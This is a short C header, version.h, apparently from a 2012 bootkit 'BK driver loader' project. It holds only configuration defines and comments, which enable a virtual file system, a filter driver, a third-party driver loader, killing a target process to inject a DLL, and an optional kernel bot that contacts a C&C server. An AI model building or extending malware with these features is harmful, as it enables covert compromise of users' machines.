//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BK driver loader project. Version 2.9.2
//	
// module: version.h
// $Revision: 68 $
// $Date: 2012-06-04 19:49:34 +0400 (Пн, 04 июн 2012) $
// description: 
//  Global project definitions.


// BK driver supports unload (when started manualy, for testing puporses only)
//#define		_DRIVER_SUPPORTS_UNLOAD		TRUE

// Enable virtual file system
#define		_BK_VFS			TRUE

// Enable filter driver
#define		_BK_FILTER		TRUE

// Enable loader for third-party drivers
#define		_BK_DRVLDR	TRUE

// Enable kernel internet protocols
//#define		_BK_KIP			TRUE

// Search and kill target process (to inject a DLL into it when the process starts)
#define		_BK_KILL_PROCESS	TRUE

#if defined(_BK_KIP)
// Enable kernel-mode client
// The client requires KIP to access the C&C server
#define		_BK_KBOT		TRUE
#endif
